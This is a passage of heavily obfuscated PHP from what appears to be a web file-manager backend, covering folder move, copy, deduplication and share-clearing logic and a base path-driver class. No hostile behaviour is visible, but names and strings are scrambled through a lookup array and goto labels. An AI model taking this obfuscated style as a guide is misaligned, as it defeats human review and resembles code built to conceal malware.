$§ã§ØüÒ[$ğ¥î¥äº[668]]) { $´ÌÎäí– = $‡ğç–[$ğ¥î¥äº[488]] == $ğ¥î¥äº[91] ? $this->_childrenListSelect($¯Á¸òõÓ) : !1; $‡òÙ¸“ = $´ÌÎäí– && count($´ÌÎäí–) > 0 ? !0 : !1; $this->removeNow($¯Á¸òõÓ, $‡òÙ¸“); } $this->lockMoveEnd($¯Á¸òõÓ); $this->lockWriteEnd($åø§™´ , $ó™®«”®); $this->folderSizeReset($‡ğç–[$ğ¥î¥äº[193]]); $this->folderSizeReset($åø§™´ ); $²êÄ´Îë = array($‡ğç–[$ğ¥î¥äº[193]], $åø§™´ ); if ($‡ğç–[$ğ¥î¥äº[488]] == $ğ¥î¥äº[91]) { $²êÄ´Îë[] = $¯Á¸òõÓ; } $this->updateModifyTime($²êÄ´Îë); Model($ğ¥î¥äº[641])->eventMove($¯Á¸òõÓ, $‡ğç–[$ğ¥î¥äº[193]], $åø§™´ ); Hook::trigger($ğ¥î¥äº[667], $òüÙ¥ËÕ); return $¦£ß¢é¶; } private function _move($ßù“´ï, $¿ÒÀûúÛ, $è¾Å©ÄÌ, &$„†“ŠÊô, $ø‚êéÜã = '') { $ßÀú‡Üñ =& $_SERVER[¼¥ÊĞÙÌ]; $¿Øß×Ÿ = $this->sourceInfo($ßù“´ï); $Œ§ëÍ’© = $¿Øß×Ÿ[$ßÀú‡Üñ[488]] == $ßÀú‡Üñ[91]; $¾´Åˆ€  = $ø‚êéÜã ? $ø‚êéÜã : $¿Øß×Ÿ[$ßÀú‡Üñ[32]]; $£‡°©òû = $this->fileNameExistAuto($¿ÒÀûúÛ, $¿Øß×Ÿ); $this->lockMoveStart($ßù“´ï); $this->lockWriteStart($¿ÒÀûúÛ, $¾´Åˆ€ ); if (!$£‡°©òû) { return $this->_moveForce($ßù“´ï, $¿ÒÀûúÛ, $¾´Åˆ€ ); } $Úö÷Ã¿ = $£‡°©òû; $òüŞ‚² = !1; if ($Œ§ëÍ’©) { if ($è¾Å©ÄÌ == REPEAT_RENAME_FOLDER) { $¾´Åˆ€  = $this->fileNameAuto($¿ÒÀûúÛ, $¾´Åˆ€ , $è¾Å©ÄÌ, $Œ§ëÍ’©); $Úö÷Ã¿ = $this->_moveForce($ßù“´ï, $¿ÒÀûúÛ, $¾´Åˆ€ ); } else { $Š¥ĞÎê = $this->_childrenListSelect($ßù“´ï); foreach ($Š¥ĞÎê as $ –…§µã) { $é»Ø»Û¼ = REPEAT_REPLACE; $this->_move($ –…§µã[$ßÀú‡Üñ[194]], $£‡°©òû, $é»Ø»Û¼, $„†“ŠÊô); } $òüŞ‚² = !0; } } else { if ($è¾Å©ÄÌ == REPEAT_RENAME || $è¾Å©ÄÌ == REPEAT_RENAME_FOLDER) { $¾´Åˆ€  = $this->fileNameAuto($¿ÒÀûúÛ, $¾´Åˆ€ , $è¾Å©ÄÌ, $Œ§ëÍ’©); $Úö÷Ã¿ = $this->_moveForce($ßù“´ï, $¿ÒÀûúÛ, $¾´Åˆ€ ); } else { $­¨ßõè¯ = $this->sourceInfoCache($£‡°©òû); $øÔåêó‹ = $this->fileHistory($­¨ßõè¯, $¿Øß×Ÿ[$ßÀú‡Üñ[546]], $¿Øß×Ÿ[$ßÀú‡Üñ[79]]); if ($øÔåêó‹) { $„†“ŠÊô[$ßÀú‡Üñ[637]][] = $¿Øß×Ÿ[$ßÀú‡Üñ[546]]; } $òüŞ‚² = !0; } } if ($òüŞ‚²) { $„†“ŠÊô[$ßÀú‡Üñ[668]] = !0; } return $Úö÷Ã¿; } private function _moveForce($Á—¬¤€ï, $ÂøÎÈîö, $¹³úÄÀß) { $·«»şºƒ =& $_SERVER[¼¥ÊĞÙÌ]; $ªüèæ±¶ = $this->sourceInfo($Á—¬¤€ï); $—£«œ»² = $this->sourceInfo($ÂøÎÈîö); $òó‰ ‰å = $ªüèæ±¶[$·«»şºƒ[488]] == $·«»şºƒ[91]; $ÏåÓí³ò = array($·«»şºƒ[480] => $—£«œ»²[$·«»şºƒ[194]], $·«»şºƒ[660] => $—£«œ»²[$·«»şºƒ[589]] . $—£«œ»²[$·«»şºƒ[194]] . $·«»şºƒ[50], $·«»şºƒ[656] => $—£«œ»²[$·«»şºƒ[191]], $·«»şºƒ[657] => $—£«œ»²[$·«»şºƒ[574]], $·«»şºƒ[659] => USER_ID, $·«»şºƒ[497] => $¹³úÄÀß); $ƒÕïÂ«½ = $ªüèæ±¶[$·«»şºƒ[191]] == SourceModel::TYPE_GROUP && $—£«œ»²[$·«»şºƒ[191]] == SourceModel::TYPE_GROUP && $ªüèæ±¶[$·«»şºƒ[574]] == $—£«œ»²[$·«»şºƒ[574]]; if (!$ƒÕïÂ«½ && $this->moveClearAuth) { Model($·«»şºƒ[572])->authClear($Á—¬¤€ï); } $æ¦ÎÀ´Ï = $ªüèæ±¶[$·«»şºƒ[508]] == $·«»şºƒ[91] && $—£«œ»²[$·«»şºƒ[508]] != $·«»şºƒ[91]; if ($æ¦ÎÀ´Ï) { $ÏåÓí³ò[$·«»şºƒ[507]] = 0; } if ($òó‰ ‰å) { $äµ°ğ¶ = array($·«»şºƒ[660] => array($·«»şºƒ[620], $ªüèæ±¶[$·«»şºƒ[589]] . $ªüèæ±¶[$·«»şºƒ[194]] . $·«»şºƒ[621])); $ñÉ¸¶ÇÌ = $ªüèæ±¶[$·«»şºƒ[589]] . $ªüèæ±¶[$·«»şºƒ[194]] . $·«»şºƒ[50]; $Ü†¿²Î = $—£«œ»²[$·«»şºƒ[589]] . $—£«œ»²[$·«»şºƒ[194]] . $·«»şºƒ[50] . $ªüèæ±¶[$·«»şºƒ[194]] . $·«»şºƒ[50]; $£é»İ÷€ = array($·«»şºƒ[660] => array($·«»şºƒ[669], "\x72\145\160\x6c\141\143\145\50\160\x61\162\145\x6e\164\114\145\x76\145\154\54\x27{$ñÉ¸¶ÇÌ}\47\x2c\47{$Ü†¿²Î}\x27\x29"), $·«»şºƒ[656] => $—£«œ»²[$·«»şºƒ[191]], $·«»şºƒ[657] => $—£«œ»²[$·«»şºƒ[574]]); if ($æ¦ÎÀ´Ï) { $£é»İ÷€[$·«»şºƒ[507]] = 0; } $this->where($äµ°ğ¶)->data($£é»İ÷€)->save(); } $this->where(array($·«»şºƒ[494] => $Á—¬¤€ï))->data($ÏåÓí³ò)->save(); return $Á—¬¤€ï; } private function clearShare($¾˜÷ûÖÅ, $¨ƒ‚‡şõ) { $ùë©Î×Ÿ =& $_SERVER[¼¥ÊĞÙÌ]; $ûÖÌúØí = $this->sourceInfo($¾˜÷ûÖÅ); $ İ­İÈ = $this->sourceInfo($¨ƒ‚‡şõ); if ($ûÖÌúØí[$ùë©Î×Ÿ[574]] == $ İ­İÈ[$ùë©Î×Ÿ[574]] && $ûÖÌúØí[$ùë©Î×Ÿ[191]] == $ùë©Î×Ÿ[670]) { return; } $ïşİ—Æé = array($ùë©Î×Ÿ[589] => array($ùë©Î×Ÿ[620], $ûÖÌúØí[$ùë©Î×Ÿ[589]] . $¾˜÷ûÖÅ . $ùë©Î×Ÿ[621])); $¾£õ™üó = $this->field($ùë©Î×Ÿ[494])->where($ïşİ—Æé)->getField($ùë©Î×Ÿ[194], !0); if (!$¾£õ™üó) { return; } $ïşİ—Æé = array($ùë©Î×Ÿ[194] => array($ùë©Î×Ÿ[7], $¾£õ™üó), $ùë©Î×Ÿ[671] => 1); $ëÛµ²Â¦ = Model($ùë©Î×Ÿ[672])->field($ùë©Î×Ÿ[673])->where($ïşİ—Æé)->select(); if (!$ëÛµ²Â¦) { return; } $ëÛµ²Â¦ = array_to_keyvalue($ëÛµ²Â¦, $ùë©Î×Ÿ[12], $ùë©Î×Ÿ[673]); $ïşİ—Æé = array($ùë©Î×Ÿ[673] => array($ùë©Î×Ÿ[7], $ëÛµ²Â¦)); Model($ùë©Î×Ÿ[672])->where($ïşİ—Æé)->save(array($ùë©Î×Ÿ[671] => 0)); Model($ùë©Î×Ÿ[674])->where($ïşİ—Æé)->delete(); } public function copyFolderFromIO($Êı³ö¹’, $ıˆò¾ƒ, $É·Œµøæ, $©ªƒæ«ù, $ìÄôÒ¿ô, $”­•öÄä = false) { $ĞšÍŞ²Á =& $_SERVER[¼¥ÊĞÙÌ]; $Ø«Ú³ôâ = array($ĞšÍŞ²Á[638] => array(), $ĞšÍŞ²Á[639] => array(), $ĞšÍŞ²Á[637] => array(), $ĞšÍŞ²Á[675] => array()); $˜Öê…ßì = $”­•öÄä ? $”­•öÄä : $Êı³ö¹’->pathThis($ıˆò¾ƒ); $š¯Â›Æ³ = $this->fileNameExist($É·Œµøæ, $˜Öê…ßì); $ÅÀÊ«‘© = $this->mkdir($É·Œµøæ, $˜Öê…ßì, $©ªƒæ«ù); if (!$š¯Â›Æ³ || $©ªƒæ«ù == REPEAT_RENAME_FOLDER) { $©ªƒæ«ù = !1; } if ($š¯Â›Æ³) { $this->_childrenAllMake($š¯Â›Æ³); } Hook::trigger($ĞšÍŞ²Á[676]); $ı¿Åîû« = KodIO::ioFileDriverGet($ĞšÍŞ²Á[486] . $É·Œµøæ . $ĞšÍŞ²Á[405]); $this->_copyChildTo($Êı³ö¹’, $ıˆò¾ƒ, $ÅÀÊ«‘©, $©ªƒæ«ù, $Ø«Ú³ôâ, $ìÄôÒ¿ô, $ı¿Åîû«); Hook::trigger($ĞšÍŞ²Á[677]); if ($ÅÀÊ«‘©) { $this->folderSizeResetChildren($ÅÀÊ«‘©); } $this->_childrenListClear(); Model($ĞšÍŞ²Á[640])->addAll($Ø«Ú³ôâ[$ĞšÍŞ²Á[638]], array(), !0); Model($ĞšÍŞ²Á[641])->eventCopy($ÅÀÊ«‘©); $this->saveAll($Ø«Ú³ôâ[$ĞšÍŞ²Á[639]]); Model($ĞšÍŞ²Á[549])->linkAdd($Ø«Ú³ôâ[$ĞšÍŞ²Á[637]]); Model($ĞšÍŞ²Á[549])->remove($Ø«Ú³ôâ[$ĞšÍŞ²Á[675]]); $this->folderSizeReset($É·Œµøæ); $this->updateModifyTime($É·Œµøæ); return $ÅÀÊ«‘©; } private function _copyChildTo($ø—Ö„ÓÀ, $¡½ƒ‘Ã³, $Ü¶°îñ, $øµ–Õ¥, &$Çü„ùñ, $¼´äùÕ¤, $Í˜üßØ¡) { $ËÉÕúÔì =& $_SERVER[¼¥ÊĞÙÌ]; $ª„À”»ë = $this->sourceInfoCache($Ü¶°îñ); $æŠ‹Ï–² = $ø—Ö„ÓÀ->listPath($¡½ƒ‘Ã³); $æŠ‹Ï–² = $æŠ‹Ï–² ? $æŠ‹Ï–² : array($ËÉÕúÔì[86] => array(), $ËÉÕúÔì[85] => array()); $ğø’˜˜ = array_merge($æŠ‹Ï–²[$ËÉÕúÔì[86]], $æŠ‹Ï–²[$ËÉÕúÔì[85]]); $“ÌåŸŸâ = $this->_addFiles($ø—Ö„ÓÀ, $Í˜üßØ¡, $æŠ‹Ï–²[$ËÉÕúÔì[86]], $¼´äùÕ¤); $µÊº©¦ = array(); foreach ($ğø’˜˜ as &$ÅšÜ±Œ£) { if (isset($“ÌåŸŸâ[$ÅšÜ±Œ£[$ËÉÕúÔì[32]]])) { $ÅšÜ±Œ£ = $“ÌåŸŸâ[$ÅšÜ±Œ£[$ËÉÕúÔì[32]]]; } $ÅšÜ±Œ£[$ËÉÕúÔì[488]] = $ÅšÜ±Œ£[$ËÉÕúÔì[33]] == $ËÉÕúÔì[78]; $ÅšÜ±Œ£[$ËÉÕúÔì[489]] = substr(_get($ÅšÜ±Œ£, $ËÉÕúÔì[169], $ËÉÕúÔì[12]), 0, 10); $ÅšÜ±Œ£[$ËÉÕúÔì[79]] = _get($ÅšÜ±Œ£, $ËÉÕúÔì[79], 0); $ÅšÜ±Œ£[$ËÉÕúÔì[546]] = _get($ÅšÜ±Œ£, $ËÉÕúÔì[546], 0); if (!isset($ÅšÜ±Œ£[$ËÉÕúÔì[678]]) && $ÅšÜ±Œ£[$ËÉÕúÔì[546]]) { $Çü„ùñ[$ËÉÕúÔì[675]][] = $ÅšÜ±Œ£[$ËÉÕúÔì[546]]; } if ($øµ–Õ¥) { $Á¶î–¹Ê = $this->fileNameExistCache($Ü¶°îñ, $ÅšÜ±Œ£[$ËÉÕúÔì[32]]); if ($Á¶î–¹Ê) { if ($ÅšÜ±Œ£[$ËÉÕúÔì[488]] || $øµ–Õ¥ == REPEAT_SKIP) { continue; } if ($øµ–Õ¥ == REPEAT_REPLACE) { $³ıÙÔáİ = $this->sourceInfoCache($Á¶î–¹Ê); $ÛôšĞìã = $this->fileHistory($³ıÙÔáİ, $ÅšÜ±Œ£[$ËÉÕúÔì[546]], $ÅšÜ±Œ£[$ËÉÕúÔì[79]]); if ($ÛôšĞìã) { $Çü„ùñ[$ËÉÕúÔì[637]][] = $ÅšÜ±Œ£[$ËÉÕúÔì[546]]; } continue; } else { if ($øµ–Õ¥ == REPEAT_RENAME) { $ÅšÜ±Œ£[$ËÉÕúÔì[32]] = $this->fileNameAutoCache($Ü¶°îñ, $ÅšÜ±Œ£[$ËÉÕúÔì[32]], $øµ–Õ¥, !1); } } } } if (!$ÅšÜ±Œ£[$ËÉÕúÔì[488]] && $ÅšÜ±Œ£[$ËÉÕúÔì[546]] == 0) { continue; } if (!$ÅšÜ±Œ£[$ËÉÕúÔì[488]] && $ÅšÜ±Œ£[$ËÉÕúÔì[546]]) { $Çü„ùñ[$ËÉÕúÔì[637]][] = $ÅšÜ±Œ£[$ËÉÕúÔì[546]]; } $µÊº©¦[] = $this->_makeItemData($ÅšÜ±Œ£, $ª„À”»ë, $ÅšÜ±Œ£[$ËÉÕúÔì[32]]); } unset($ÅšÜ±Œ£); if (!empty($µÊº©¦)) { $this->addAll($µÊº©¦); $this->_childrenListSelect($Ü¶°îñ); } $ØšéÜ = $this->_childrenList($Ü¶°îñ); $ØšéÜ = array_to_keyvalue($ØšéÜ, $ËÉÕúÔì[32]); foreach ($ğø’˜˜ as $ÅšÜ±Œ£) { $³ıÙÔáİ = $ØšéÜ[$ÅšÜ±Œ£[$ËÉÕúÔì[32]]]; $Íï´Éó´ = $³ıÙÔáİ[$ËÉÕúÔì[194]]; $this->_copyApplyMeta($³ıÙÔáİ, $Çü„ùñ); if ($ÅšÜ±Œ£[$ËÉÕúÔì[33]] == $ËÉÕúÔì[78]) { $ÅšÜ±Œ£[$ËÉÕúÔì[87]] = $ø—Ö„ÓÀ->getPathInner($ÅšÜ±Œ£[$ËÉÕúÔì[87]]); $this->_copyChildTo($ø—Ö„ÓÀ, $ÅšÜ±Œ£[$ËÉÕúÔì[87]], $Íï´Éó´, $øµ–Õ¥, $Çü„ùñ, $¼´äùÕ¤, $Í˜üßØ¡); } } } private function _addFiles($ì¯®»ü, $ß©©Ø¨í, $¥Äå˜„², $åĞŸËÂ) { $„å¶›ïÛ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$¥Äå˜„² || count($¥Äå˜„²) == 0) { return array(); } $øøÚå• = array(); foreach ($¥Äå˜„² as &$üÄåäµ) { Hook::trigger($„å¶›ïÛ[679], $üÄåäµ); $üÄåäµ[$„å¶›ïÛ[87]] = $ì¯®»ü->getPathInner($üÄåäµ[$„å¶›ïÛ[87]]); $ËíÒÇç» = $ì¯®»ü->hashSimple($üÄåäµ[$„å¶›ïÛ[87]]); $šêœ ƒš = $ì¯®»ü->hashMd5($üÄåäµ[$„å¶›ïÛ[87]]); if (strlen($šêœ ƒš) > 10 && !isset($øøÚå•[$šêœ ƒš])) { $øøÚå•[$šêœ ƒš] = array(); } $üÄåäµ[$„å¶›ïÛ[680]] = $ËíÒÇç»; $üÄåäµ[$„å¶›ïÛ[552]] = $šêœ ƒš; $øøÚå•[$šêœ ƒš][] =& $üÄåäµ; if (count($øøÚå•[$šêœ ƒš]) > 1) { $üÄåäµ[$„å¶›ïÛ[678]] = !0; } Hook::trigger($„å¶›ïÛ[681], $üÄåäµ); } unset($üÄåäµ); $çİØµúÙ = array($„å¶›ïÛ[552] => array($„å¶›ïÛ[7], array_keys($øøÚå•))); $›İ«±éü = Model($„å¶›ïÛ[682]); $ã©í÷ß = $›İ«±éü->where($çİØµúÙ)->select(); $ã©í÷ß = $ã©í÷ß ? $ã©í÷ß : array(); foreach ($ã©í÷ß as $Ù£¾¤ñŞ) { if (!isset($øøÚå•[$Ù£¾¤ñŞ[$„å¶›ïÛ[552]]])) { continue; } $û²ÍÏÒ® = $øøÚå•[$Ù£¾¤ñŞ[$„å¶›ïÛ[552]]]; foreach ($û²ÍÏÒ® as &$üÄåäµ) { $üÄåäµ[$„å¶›ïÛ[546]] = $Ù£¾¤ñŞ[$„å¶›ïÛ[546]]; $üÄåäµ[$„å¶›ïÛ[678]] = !0; } unset($üÄåäµ); } $øœ£©Šè = array(); foreach ($¥Äå˜„² as $ÄèÙÚÌß) { Hook::trigger($„å¶›ïÛ[683], $ÄèÙÚÌß); if (isset($ÄèÙÚÌß[$„å¶›ïÛ[678]]) && $ÄèÙÚÌß[$„å¶›ïÛ[678]]) { Hook::trigger($„å¶›ïÛ[684], $ÄèÙÚÌß); continue; } $ëÂÌı¦™ = $ì¯®»ü->getPathInner($ÄèÙÚÌß[$„å¶›ïÛ[87]]); $Ö„ñùì­ = $›İ«±éü->addFileMake($ëÂÌı¦™, $ß©©Ø¨í, $ÄèÙÚÌß[$„å¶›ïÛ[79]], $ÄèÙÚÌß[$„å¶›ïÛ[680]], $ÄèÙÚÌß[$„å¶›ïÛ[552]], $ÄèÙÚÌß[$„å¶›ïÛ[32]], $åĞŸËÂ); Hook::trigger($„å¶›ïÛ[684], $ÄèÙÚÌß); if (!is_array($Ö„ñùì­)) { continue; } $øœ£©Šè[] = $Ö„ñùì­; } $›İ«±éü->addAll($øœ£©Šè); $çİØµúÙ = array($„å¶›ïÛ[552] => array($„å¶›ïÛ[7], array_keys($øøÚå•))); $ã©í÷ß = $›İ«±éü->where($çİØµúÙ)->select(); $ã©í÷ß = $ã©í÷ß ? $ã©í÷ß : array(); foreach ($ã©í÷ß as $Ù£¾¤ñŞ) { if (!isset($øøÚå•[$Ù£¾¤ñŞ[$„å¶›ïÛ[552]]])) { continue; } $øßÁ±ÓÙ =& $øøÚå•[$Ù£¾¤ñŞ[$„å¶›ïÛ[552]]]; foreach ($øßÁ±ÓÙ as &$üÄåäµ) { $üÄåäµ[$„å¶›ïÛ[546]] = $Ù£¾¤ñŞ[$„å¶›ïÛ[546]]; } unset($üÄåäµ); } $ğ×Ö¹ƒ‰ = array(); foreach ($¥Äå˜„² as $ß¥ÒŠÒÅ) { $ğ×Ö¹ƒ‰[$ß¥ÒŠÒÅ[$„å¶›ïÛ[32]]] = $ß¥ÒŠÒÅ; } return $ğ×Ö¹ƒ‰; } } define($_SERVER[¼¥ÊĞÙÌ][685], $_SERVER[¼¥ÊĞÙÌ][686]); $lnpxastzbh = $_SERVER[¼¥ÊĞÙÌ][687]; goto FÎğ–§–·; cªéÏĞ×‡: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $»¡’‹Ø =& $_SERVER[¼¥ÊĞÙÌ]; $this->objectDriver = array($»¡’‹Ø[60], $»¡’‹Ø[61], $»¡’‹Ø[62], $»¡’‹Ø[63], $»¡’‹Ø[64], $»¡’‹Ø[65], $»¡’‹Ø[66], $»¡’‹Ø[67], $»¡’‹Ø[68], $»¡’‹Ø[69], $»¡’‹Ø[70], $»¡’‹Ø[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($“è—·¯Ì) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($“è—·¯Ì, $_SERVER[¼¥ÊĞÙÌ][8]); } return $“è—·¯Ì; } public function iconvApp($øß×ÇÆ¿) { return $øß×ÇÆ¿; } public function iconvSystem($¿ÎêÑ¼²) { return $¿ÎêÑ¼²; } public function iconvTo($ş¯¿ûäí, $õŞŞÛõÇ, $åÆ‘¶¢) { $‚ı¢œÄ¨ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ş¯¿ûäí || !function_exists($‚ı¢œÄ¨[72])) { return $ş¯¿ûäí; } static $ï•¤…È = array(); $Û¤Ã–î´ = $õŞŞÛõÇ . $‚ı¢œÄ¨[73] . $åÆ‘¶¢ . $‚ı¢œÄ¨[74] . $ş¯¿ûäí; if (isset($ï•¤…È[$Û¤Ã–î´])) { return $ï•¤…È[$Û¤Ã–î´]; } if (function_exists($‚ı¢œÄ¨[75])) { $¢ÚÁŠØ = @mb_convert_encoding($ş¯¿ûäí, $åÆ‘¶¢, $õŞŞÛõÇ); } else { $¢ÚÁŠØ = @iconv($õŞŞÛõÇ, $åÆ‘¶¢, $ş¯¿ûäí); } $¢ÚÁŠØ = $¢ÚÁŠØ ? $¢ÚÁŠØ : $ş¯¿ûäí; if (strstr($¢ÚÁŠØ, $‚ı¢œÄ¨[76])) { $¢ÚÁŠØ = str_replace($‚ı¢œÄ¨[76], $‚ı¢œÄ¨[11], $¢ÚÁŠØ); } $ï•¤…È[$õŞŞÛõÇ . $‚ı¢œÄ¨[73] . $åÆ‘¶¢ . $‚ı¢œÄ¨[74] . $ş¯¿ûäí] = $¢ÚÁŠØ; $ï•¤…È[$åÆ‘¶¢ . $‚ı¢œÄ¨[73] . $õŞŞÛõÇ . $‚ı¢œÄ¨[74] . $ş¯¿ûäí] = $ş¯¿ûäí; $ï•¤…È[$åÆ‘¶¢ . $‚ı¢œÄ¨[73] . $õŞŞÛõÇ . $‚ı¢œÄ¨[74] . $¢ÚÁŠØ] = $ş¯¿ûäí; $ï•¤…È[$õŞŞÛõÇ . $‚ı¢œÄ¨[73] . $åÆ‘¶¢ . $‚ı¢œÄ¨[74] . $¢ÚÁŠØ] = $¢ÚÁŠØ; return $¢ÚÁŠØ; } public function getPathInner($Ÿ×Ò²ç) { $ÊÉÇ«İ¥ = IO::init($Ÿ×Ò²ç); return $ÊÉÇ«İ¥->path; } public function getPathOuter($î‚°»ùÑ) { $ÆÚÜ‡ÆÔ =& $_SERVER[¼¥ÊĞÙÌ]; $áéı¥œ… = strlen(trim($this->pathBase, $ÆÚÜ‡ÆÔ[8])); $î‚°»ùÑ = substr(trim($î‚°»ùÑ, $ÆÚÜ‡ÆÔ[8]), $áéı¥œ…); return $this->pathDriver . $ÆÚÜ‡ÆÔ[8] . ltrim($î‚°»ùÑ, $ÆÚÜ‡ÆÔ[8]); } public function isParentOf($Œ°­ªÊ–, $İ•îÜ¯ø) { $˜²òûéÁ =& $_SERVER[¼¥ÊĞÙÌ]; $Œ°­ªÊ– = rtrim(strtolower($Œ°­ªÊ–), $˜²òûéÁ[8]) . $˜²òûéÁ[8]; $İ•îÜ¯ø = rtrim(strtolower($İ•îÜ¯ø), $˜²òûéÁ[8]) . $˜²òûéÁ[8]; $ã×ŞÔÒ¯ = strpos($İ•îÜ¯ø, $Œ°­ªÊ–) === 0; return $ã×ŞÔÒ¯; } public function getType() { $ºŞÅïı˜ =& $_SERVER[¼¥ÊĞÙÌ]; $·ãğ«¢ = str_replace($ºŞÅïı˜[77], $ºŞÅïı˜[12], get_class($this)); return strtolower($·ãğ«¢); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($âÇˆ˜€Ğ, $òÓ®ŸœÕ) { $éŠœÆßÙ =& $_SERVER[¼¥ÊĞÙÌ]; $ŸÉÏåÖö = rtrim($âÇˆ˜€Ğ, $éŠœÆßÙ[8]) . $éŠœÆßÙ[8] . $òÓ®ŸœÕ; $ãÕ‘”îõ = $this->exist($ŸÉÏåÖö); return $ãÕ‘”îõ ? $ŸÉÏåÖö : !1; } public function setModifyTime($±š°¤¾Ù, $”²‚Ï–Û = '') { } public function renameObject($¬ŞêÄ’µ, $ÆôôÈÓÒ) { $·ËÆ›Î™ = $ÆôôÈÓÒ; $¬ŞêÄ’µ = $this->getPathOuter($¬ŞêÄ’µ); $ÆôôÈÓÒ = $this->pathFather($¬ŞêÄ’µ) . $ÆôôÈÓÒ; $š“ÖŸ› = IO::copy($¬ŞêÄ’µ, $this->pathFather($¬ŞêÄ’µ), REPEAT_RENAME_FOLDER, $·ËÆ›Î™); if ($š“ÖŸ›) { IO::remove($¬ŞêÄ’µ); } return $š“ÖŸ› ? $ÆôôÈÓÒ : !1; } public function tempFile($Ô¹¯±üñ = '', $§›¥şË = '') { if (!$Ô¹¯±üñ) { $Ô¹¯±üñ = rand_string(15); } $êí›³ƒ° = TEMP_FILES . rand_string(15) . $_SERVER[¼¥ÊĞÙÌ][8]; @mkdir($êí›³ƒ°, DEFAULT_PERRMISSIONS, !0); $ˆœ«íá‰ = $êí›³ƒ° . $Ô¹¯±üñ; @touch($ˆœ«íá‰); if ($§›¥şË) { file_put_contents($ˆœ«íá‰, $§›¥şË); } return $ˆœ«íá‰; } public function tempFileRemve($½ãªÉâæ) { @unlink($½ãªÉâæ); @rmdir($this->pathFather($½ãªÉâæ)); } public function mkfile($ıÀ½ş, $õÏúÆŞÇ = '', $¾ˆÚ¿ñ¶ = REPEAT_RENAME) { } public function mkdir($÷ıÓÍÁü, $â·“ßê = REPEAT_SKIP) { } public function delFile($Şƒ™‚ôÊ) { } public function delFolder($´Ú¹ËçŒ) { } public function copyFile($¹Ã§¡÷, $¿¦ÍÔ­) { } public function moveFile($Àí×ó´õ, $¢ÌŸ×Àˆ) { } public function remove($…çñäö) { if ($this->isFile($…çñäö)) { return $this->delFile($…çñäö); } return $this->delFolder($…çñäö); } public function rename($ğö†ª®À, $¤¯¸Ôƒ») { } public function exist($Ëô¢÷Å¹) { } public function findByHash($ÂÅ¶Š‘Ó = '', $ñ’êŸİƒ = '') { return !1; } public function isFile($Ä¯Ø†Å) { } public function isFolder($§æÈ—£Û) { } public function size($‹ÚÖØçø) { } public function info($ÅÓ›¸åŠ) { } public function infoSimple($§·ıªù¸) { return $this->info($§·ıªù¸); } public function infoAuth($ä§ôİ¹) { return $this->info($ä§ôİ¹); } public function infoFull($‹ƒ²”ö) { return $this->info($‹ƒ²”ö); } public function infoFullSimple($×ıëş“Ü) { return $this->info($×ıëş“Ü); } public function infoWithChildren($ÊÖ˜Õê) { $¸ ãç¹¤ =& $_SERVER[¼¥ÊĞÙÌ]; static $ÊËÃ‚¤² = array(); if (isset($ÊËÃ‚¤²[$ÊÖ˜Õê])) { return $ÊËÃ‚¤²[$ÊÖ˜Õê]; } $Ã¾şèì = $this->info($ÊÖ˜Õê); if ($Ã¾şèì && $Ã¾şèì[$¸ ãç¹¤[33]] == $¸ ãç¹¤[78]) { $ëé••¡… = array($¸ ãç¹¤[79] => 0, $¸ ãç¹¤[80] => 0, $¸ ãç¹¤[81] => 0); $this->infoChildren($ÊÖ˜Õê, $ëé••¡…); $Ã¾şèì[$¸ ãç¹¤[79]] = $ëé••¡…[$¸ ãç¹¤[79]]; $Ã¾şèì[$¸ ãç¹¤[82]] = array($¸ ãç¹¤[83] => $ëé••¡…[$¸ ãç¹¤[80]], $¸ ãç¹¤[84] => $ëé••¡…[$¸ ãç¹¤[81]]); $ÊËÃ‚¤²[$ÊÖ˜Õê] = $Ã¾şèì; } return $Ã¾şèì; } public function listPath($Áå™ûò, $™Õò¾¶½ = false) { } public function has($ÄñÇË€, $›´Ÿìêí = false, $À¦©§Ê = false) { } public function canRead($ñË™ÅŠÖ) { } public function canWrite($¤óœ¡ÓÔ) { } public function getContent($½‰î‡“ë) { } public function setContent($Òæâ‰¡¯, $šî×¢ß– = '') { } protected function infoChildren($Æ§Š‰¦, &$®«ªÃÒì) { $¶ÒåÃĞË =& $_SERVER[¼¥ÊĞÙÌ]; check_abort_echo(); $¯é¦î§¼ = $this->listPath($Æ§Š‰¦, !0); $¯é¦î§¼ = array_merge($¯é¦î§¼[$¶ÒåÃĞË[85]], $¯é¦î§¼[$¶ÒåÃĞË[86]]); foreach ($¯é¦î§¼ as $óªÜ¼ƒÌ) { if ($óªÜ¼ƒÌ[$¶ÒåÃĞË[33]] == $¶ÒåÃĞË[78]) { $®«ªÃÒì[$¶ÒåÃĞË[81]]++; $¿¿‡ùø§ = $this->getPathInner($óªÜ¼ƒÌ[$¶ÒåÃĞË[87]]); $this->infoChildren($¿¿‡ùø§, $®«ªÃÒì); } else { $®«ªÃÒì[$¶ÒåÃĞË[80]]++; $®«ªÃÒì[$¶ÒåÃĞË[79]] += $óªÜ¼ƒÌ[$¶ÒåÃĞË[79]]; } } } public function fileSubstr($«°÷¹ÄĞ, $½³ÅÙúã, $â™¾ÆÔÏ) { } public function listAll($İ£…±Ñ€) { } public function listAllMake($ƒµ¥·ÒÅ, &$ÖêÃç¿) { $²íÇŠŸ¦ =& $_SERVER[¼¥ÊĞÙÌ]; check_abort_echo(); $êÆá¨‰Ù = $this->listPath($ƒµ¥·ÒÅ, !0); if (!$êÆá¨‰Ù) { return; } $¡·Şİ‰¡ = array_merge($êÆá¨‰Ù[$²íÇŠŸ¦[85]], $êÆá¨‰Ù[$²íÇŠŸ¦[86]]); foreach ($¡·Şİ‰¡ as $çş»×ú) { $êúñòŸÄ = $çş»×ú[$²íÇŠŸ¦[33]] == $²íÇŠŸ¦[78]; $ïÔêÅ¹ = array($²íÇŠŸ¦[87] => $çş»×ú[$²íÇŠŸ¦[87]], $²íÇŠŸ¦[78] => $êúñòŸÄ); if (isset($çş»×ú[$²íÇŠŸ¦[79]])) { $ïÔêÅ¹[$²íÇŠŸ¦[79]] = $çş»×ú[$²íÇŠŸ¦[79]]; } if (isset($çş»×ú[$²íÇŠŸ¦[88]])) { $ïÔêÅ¹[$²íÇŠŸ¦[88]] = $çş»×ú[$²íÇŠŸ¦[88]]; } if (!$êúñòŸÄ) { $ÖêÃç¿[] = 